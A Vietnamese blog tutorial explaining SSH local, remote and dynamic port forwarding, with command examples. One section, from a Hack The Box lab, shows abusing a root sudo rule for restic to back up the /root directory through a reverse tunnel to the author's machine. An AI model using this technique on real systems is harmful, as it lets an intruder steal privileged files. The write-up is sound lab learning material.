# SSH Tunneling
Giao thức SSH hiện nay là một trong những giao thức phổ biến nhất để tunneling và port forwarding. SSH Tunnel cho phép trao đổi dữ liệu thông qua một kênh mã hoá. Với việc thiết lập SSH Tunnel cực kỳ đơn giản và nhiều ứng dụng nên giao thức này ngày càng phổ biến. Ở bài viết này mình sẽ nói về một số ứng dụng của SSH Tunnel.
## Local Port Forwarding
SSH Local Port Forwarding được sử dụng để chuyển tiếp 1 port từ máy local đến máy server (hoặc ngược lại) bằng cách sử dụng giao thức SSH để vận chuyển. 

Người dùng có thể sử dụng Local Port Forwarding để:
- Kết nối với dịch vụ trong mạng nội bộ từ bên ngoài.
- Sử dụng để chuyển file qua internet.
- Tạo phiên và chuyển tập tin qua Jump Server (cái này mình chưa sử dụng bao giờ :().

![](https://images.viblo.asia/810cdfd5-1abf-494d-ba58-76e911048ce4.png)

### Ví dụ
Thử tưởng tượng bạn cài đặt một trang web test ở cổng 80 trên server của bạn, nhưng bạn lại không muốn public trang web đó ra mà chỉ muốn sử dụng ở trên local. Hoặc là bạn đang ở nhà, bạn muốn vào trang web được đặt trên server của công ty mà chỉ được vào với ip nội bộ. Nhưng bạn lại có SSH đến server đó, vậy bạn có thể chuyển tiếp port từ server của công ty về port trên máy bạn bằng cách.
```bash
ssh -L 9000:127.0.0.1:80 user@<ip address>
```
Vậy bây giờ bạn có thể truy cập vào website nằm trên server công ty bằng cách truy cập http://localhost:9000.

Hay một ví dụ khác là bạn muốn truy cập database trên website của bạn nhưng bạn không thích dùng terminal mà bạn lại thích dùng giao diện hơn. Vậy bạn có thể chuyển cổng 3306 trên server về local máy bạn rồi sử dụng một số chương trình để truy cập CSDL của bạn như Navicat hay Workbench Mysql.
## Remote Port Forwarding
SSH Remote Port Forwarding cho phép bạn chuyển lưu lượng truy cập từ 1 port ở máy của bạn lên SSH server.  
Cú pháp
```bash
ssh -R 8080:localhost:80 public.example.com
```
Điều này cho phép bất cứ ai truy cập vào máy chủ `public.example.com` vào cổng 8080 sẽ được chuyển đến cổng 80 trên máy bạn. 

![](https://images.viblo.asia/e838ed50-9335-45bf-b9eb-a8329aaffb06.png)
Tuy nhiên, Remote Port Forwarding mặc định được tắt trên SSH. Để kích hoạt tính năng này, bạn cần thêm một dòng vào tệp cấu hình SSH `/etc/ssh/sshd_config`
```bash /etc/ssh/sshd_config
GatewayPorts yes
```
Và khởi động lại SSH
```bash
$ sudo service ssh restart
```

### Ví dụ

Ví dụ bạn đang code 1 website, nhưng khách hàng đang muốn bạn demo từ xa. Do code đang nằm trên máy bạn, và bạn không có thời gian deploy lên server để demo cho khách hàng. Bạn có thể sử dụng Remote Port Forwarding để chuyển cổng web trên máy local lên server để demo cho khách hàng. 
```bash
ssh -R 80:localhost:80 user@<ip public>
```
Vậy khách hàng có thể truy cập tới http://<ip public> là có thể vào trang mà bạn đang code trên local rồi.

Hoặc một ví dụ khác, đây là một ví dụ về một machine tên **Registry** trên [Hackthebox](http://hackthebox.eu/). 

Tại server machine cho phép user `www-data` sử dụng câu lệnh với quyền root như sau:
```bash
User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```
Restic là 1 opensource sử dụng để backup, cần sử dụng Restic server để backup. Tuy nhiên trên server lại không có Restic server. Vậy nên mình đã dựng một Restic server ở trên máy local và sử dụng Remote Port Forwarding để kết nối Restic server lên machine.
```bash
ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159
```
Và sau đó mình đã backup lại được thư mục `/root` với quyền **root**
```bash
www-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root
<n/restic backup -r rest:http://127.0.0.1:8000 /root
enter password for repository: 123123

password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 14 files in 0:00
[0:01] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 
duration: 0:01
snapshot e5ef88b3 saved
www-data@bolt:~/html$ 
```
Machine này đã được mình viết solusion ở tại blog của mình. Nếu bạn đọc cảm thấy hấp dẫn thì có thể ghé qua blog của mình tại https://minhtuanact.github.io/post/writeup-htb-registry/

## Dynamic Port Forwarding
Dynamic Port Forwarding cho phép bạn tạo một kết nối socket trên máy local (ssh client) tới máy server (ssh server), hoạt động như một máy chủ SOCKS proxy. Khi client kết nối với cổng này, kết nối được chuyển tiếp (Forwarding) đến ssh server, sau đó được chuyển tiếp đến một cổng động (Dynamic Port) trên máy đích.  
Bằng cách này, tất cả các ứng dụng sử dụng SOCKS proxy sẽ kết nối với ssh server và ssh server sẽ chuyển tiếp tất cả lưu lượng truy cập đến đích thực tế của nó.
Chúng ta có thể setup đơn giản như sau:
Cú pháp: 
```
ssh -D 1080 -N user@<ip address>
```
- N: Yêu cầu SSH không thực hiện lệnh từ xa.
- D 9090: Mở đường hầm SOCKS theo số cổng quy định.
- user@<ip address>: Địa chỉ IP và người dùng SSH từ xa.
- Để chạy lệnh trong nền, hãy dùng -f. 
- Nếu máy chủ SSH của bạn đang nghe trên cổng khác với 22 (mặc định) thì sử dụng tùy chọn -p [PORT_NUMBER].

Setup proxy trên firefox sử dụng SOCKS v5 để kết nối, mọi request tới cổng này đều được forward đến SSH Server.
![](https://images.viblo.asia/4c5fe5c6-bcd3-4dca-b437-5371c524016d.png)

Vậy là bạn có thể ngồi ở VN nhưng lại đang duyệt web ở Singapore rồi :joy: 
![](https://images.viblo.asia/48f5333e-047c-4636-8ac7-83467b1a5c9d.png)
> Trên đây là một vài kiến thức mình lượm nhặt được, mong rằng nó có ích cho các bạn. (seeyou)

# Tham khảo
https://www.ssh.com/ssh/tunneling/  
https://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/  
https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html